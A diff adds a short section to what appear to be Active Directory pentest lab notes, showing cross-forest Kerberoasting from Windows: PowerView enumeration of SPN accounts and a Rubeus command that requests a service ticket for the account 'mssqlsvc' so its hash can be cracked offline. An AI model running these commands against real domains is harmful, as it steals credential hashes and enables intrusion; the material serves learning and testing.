@@ -30,3 +30,15 @@ compromise the trusted forest<br>
 
 <img width="1145" height="590" alt="image" src="https://github.com/user-attachments/assets/edfd7962-b784-4b90-a5f0-72d844dc82c5" />
 
+
+# From Windows ( Cross-forest kerberoasting must need -domain flag in command )
+
+1.We can use PowerView to enumerate accounts within the target domain that have associated Service Principal Names (SPNs).
+```
+Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
+```
+
+2.Let's perform a Kerberoasting attack across the trust using Rubeus and crack the offline hash
+```
+.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
+```
